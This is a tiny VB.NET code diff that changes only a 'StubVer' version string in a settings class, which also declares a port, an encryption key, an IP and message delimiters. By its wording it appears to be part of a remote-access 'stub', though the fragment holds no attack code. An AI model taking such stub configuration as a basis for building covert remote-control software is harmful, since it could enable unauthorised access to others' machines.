@@ -3,7 +3,7 @@
     Public Shared PORT As Integer
     Public Shared EncryptionKey As String
     Public Shared IP As String = String.Empty
-    Public Shared StubVer As String = "v0.1.8.4A"
+    Public Shared StubVer As String = "v0.1.8.4B"
     Public Shared SPL As String = "|'L'|"
     Public Shared ENDOF As String = "|'N'|"
 
